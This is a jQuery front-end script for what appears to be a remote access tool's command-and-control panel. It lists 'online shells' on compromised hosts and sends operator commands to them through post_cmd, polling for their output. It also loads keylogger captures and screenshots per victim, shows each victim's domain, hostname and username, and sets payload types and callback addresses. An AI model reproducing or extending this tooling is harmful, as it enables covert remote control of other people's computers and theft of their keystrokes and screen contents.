$("#http-log, #http-logs-button").on("click", function() {
    $("#logs-content, #logs-tab, #logs-content-body").css("display", "block")
    $("#logs-content-body").load("/api/get/logs/http")
    $("#error-logs-button, #event-logs-button, #chat-logs-button, #shells-logs-button, #keylogger-logs-button").removeClass("active");
    $("#http-logs-button").addClass("active");
})
$("#event-log, #event-logs-button").on("click", function() {
    $("#logs-content, #logs-tab, #logs-content-body").css("display", "block")
    $("#logs-content-body").load("/api/get/logs/event")
    $("#http-logs-button, #error-logs-button, #chat-logs-button, #shells-logs-button, #keylogger-logs-button").removeClass("active");
    $("#event-logs-button").addClass("active");
})
$("#chat-log, #chat-logs-button").on("click", function() {
    $("#logs-content, #logs-tab, #logs-content-body").css("display", "block")
    $("#logs-content-body").load("/api/get/logs/chat")
    $("#event-logs-button, #http-logs-button, #error-logs-button, #shells-logs-button, #keylogger-logs-button").removeClass("active");
    $("#chat-logs-button").addClass("active");
})
$("#error-log, #error-logs-button").on("click", function() {
    $("#logs-content, #logs-tab, #logs-content-body").css("display", "block")
    $("#logs-content-body").load("/api/get/logs/error")
    $("#chat-logs-button, #event-logs-button, #http-logs-button, #shells-logs-button, #keylogger-logs-button").removeClass("active");
    $("#error-logs-button").addClass("active");
})
$("#load-events").on("click", function() {
    $("#events-tab, #events-content").css("display", "block")
})
var currentId = "__undefined__";
var uid = "__undefined__";
var payloadType = "__undefined__";
var payloadCallback = "__undefined__";
var logStatus = "folded";

function load_dashboard() {
    $("#events-tab, #main-tab, #events-content, #events-content-body, #online-shells-content, #online-shells-content-body").css("display", "block");
    $("#logs-content, #logs-tab, #shell-tab, #shell-content-body, #shell-content, #shell-logs-content, #shell-screenshot-content").css("display", "none");
    $("#events-button, #online-shells-button").addClass("active")
}

function chat_close() {
    $("#online-shells-content").css("display", "none");
    $("#main-tab").css("display", "none");
    $("#chat-content").css("display", "none");
    $("#shell-content-body").css("min-height", "70vh");
    $("#shell-content, #shell-screenshot-content, #shell-logs-content, #shell-download-content").css("min-height", "75vh");
}

function chat_button() {
    $("#chat-content, #chat-content-body").css("display", "block");
    $("#online-shells-content").css("display", "none");
    $("#chat-button").addClass("active");
    $("#online-shells-button").removeClass("active");
    $("#chat-content-body").load("/api/get/msgs");
    $("#chat-content-body").scrollTop($("#chat-content-body")[0].scrollHeight);
}

function online_shells_button() {
    $("#online-shells-content").css("display", "block");
    $("#chat-content").css("display", "none");
    $("#chat-button").removeClass("active");
    $("#online-shells-button").addClass("active");
}

function events_close(){
    $("#events-tab, #events-content").css("display", "none");
}

function logs_button() {
    $("#events-content").css("display", "none");
    $("#events-button").removeClass("active");
    $("#logs-button").addClass("active");
    $("#logs-content").css("display", "block");
}

function events_button() {
    $("#logs-button").removeClass("active");
    $("#events-button").addClass("active");
    $("#events-content").css("display", "block");
    $("#logs-content").css("display", "none");
}

function shell_close() {
    $("#shell-content, #shell-screenshot-content, #shell-download-content, #shell-logs-content, #shell-tab, #shell-info-content").css("display", "none");
    $("#shell-button, #shell-screenshot-button, #shell-download-button, #shell-logs-button, #shell-info-button, #shell-keylogger-button").removeClass("active");
}

function shell_log_button() {
    $("#shell-logs-content").css("display", "block");
    $("#shell-content, #shell-screenshot-content, #shell-download-content, #shell-info-content, #shell-keylogger-content").css("display", "none");
    $("#shell-logs-button").addClass("active");
    $("#shell-button, #shell-screenshot-button, #shell-download-button, #shell-info-button, #shell-keylogger-button").removeClass("active");
}

function shell_download_button() {
    $("#shell-download-content").css("display", "block");
    $("#shell-content, #shell-logs-content, #shell-screenshot-content, #shell-info-content, #shell-keylogger-content").css("display", "none");
    $("#shell-download-button").addClass("active");
    $("#shell-button, #shell-logs-button, #shell-screenshot-button, #shell-info-button, #shell-keylogger-button").removeClass("active");
}

function shell_keylogger_button() {
    $("#shell-keylogger-content").css("display", "block");
    $("#shell-content, #shell-logs-content, #shell-download-content, #shell-info-content, #shell-screenshot-content").css("display", "none");
    $("#shell-keylogger-button").addClass("active");
    $("#shell-keylogger-content").load("/api/get/keylogger/" + currentId);
    $("#shell-button, #shell-logs-button, #shell-download-button, #shell-screenshot-button").removeClass("active");
}

function shell_screenshot_button() {
    $("#shell-screenshot-content").css("display", "block");
    $("#shell-content, #shell-logs-content, #shell-download-content, #shell-info-content, #shell-keylogger-content").css("display", "none");
    $("#shell-screenshot-button").addClass("active");
    $("#shell-screenshot-content").load("/api/get/screenshots/" + currentId);
    $("#shell-button, #shell-logs-button, #shell-download-button, #shell-keylogger-button").removeClass("active");
}

function shell_button() {
    $("#shell-content").css("display", "block");
    $("#shell-screenshot-content, #shell-logs-content, #shell-download-content, #shell-info-content, #shell-keylogger-content").css("display", "none");
    $("#shell-button").addClass("active");
    $("#shell-screenshot-button, #shell-logs-button, #shell-download-button, #shell-info-button, #shell-keylogger-button").removeClass("active");
}

function load_online_shells() {
    $("#online-shells-content, #main-tab").css("display", "block");
    $("#chat-content").css("display", "none");
    $("#chat-button").removeClass("active");
    $("#online-shells-button").addClass("active");
}

function load_chat() {
    $("#chat-content, #chat-content-body, #main-tab").css("display", "block");
    $("#online-shells-content").css("display", "none");
    $("#chat-button").addClass("active");
    $("#online-shells-button").removeClass("active");
}

function post_cmd() {
    var cmd = $("#shell-command").val()
    $.ajax({
        type: "POST",
        url: "/api/post/cmd/" + currentId,
        contentType: "application/json",
        data: JSON.stringify({
            "cmd": cmd
        }),
        success: function(data) {
            $("#shell-content-body").append(data + "<br>");
            $("#shell-content-body").scrollTop($("#shell-content-body")[0].scrollHeight);
        }
    });
    $("#shell-command").val("");
    return false;
}

function get_screenshots(id) {
    $("#shell-screenshot-content").load("/api/get/screenshots/" + id);
}

function get_shell_log(id) {
    $("#shell-logs-body").load("/api/get/shell-log/" + id)
}

function setPayload() {
    payloadType = $("#payload-type").val();
    payloadCallback = encodeURIComponent($("#payload-info").val());
}

function get_events() {
    $("#events-content").load("/api/get/events");
    $("#online-shells-content-body").load("/api/get/shells")
    $("#events-content").scrollTop($("#events-content")[0].scrollHeight);
    $("#chat-content-body").scrollTop($("#chat-content-body")[0].scrollHeight);
    if (currentId != "__undefined__") {
        $.get("/api/get/cmd/" + currentId, function(data) {
            if (data !== "__no_output__") {
                $("#shell-content-body").append(data + "<br>");
                $("#shell-content-body").scrollTop($("#shell-content-body")[0].scrollHeight);
            }
        });
        $.get("/api/get/output/" + currentId, function(data) {
            if (data !== "__no_output__") {
                $("#shell-content-body").append(data + "<br>");
                $("#shell-content-body").scrollTop($("#shell-content-body")[0].scrollHeight);
            }
        });
    }
}

function initiate() {
    $("#chat-content-body").load("/api/get/msgs")
    $("#events-content-body").load("/api/get/events");
    $("#online-shells-content-body").load("/api/get/shells")
    $("#events-content").scrollTop($("#events-content")[0].scrollHeight);
    $("#chat-content-body").scrollTop($("#chat-content-body")[0].scrollHeight);
}

function shell_handler(id, uuid, domain, host, user) {
    currentId = id;
    uid = uuid;
    $.post("/api/post/hook-shell/" + uid + "/" + currentId);
    $("#shell-info-button").text("[ " + domain + "\\" + user + " , ID: " + id + " ]");
    $("#shell-domain").text("Domain: " + domain);
    $("#shell-host").text("Hostname: " + host);
    $("#shell-username").text("User: " + user);
    $("#shell-id").text("Shell ID: " + id);
}

function deleteShell(id){
    var confirm = document.getElementById('confirm');
    var shellID = id.getAttribute("data-shell-id");
    confirm.onclick = function() {
      $.ajax({
        type: "POST",
        url: "/api/post/delete-shell/"+shellID,
        contentType: "application/json",
        dataType: "json",
        async: true,
        data: JSON.stringify({'user': "{{username}}"}),
        success: function(data){
          // For future??
        }
      });
    };
  };
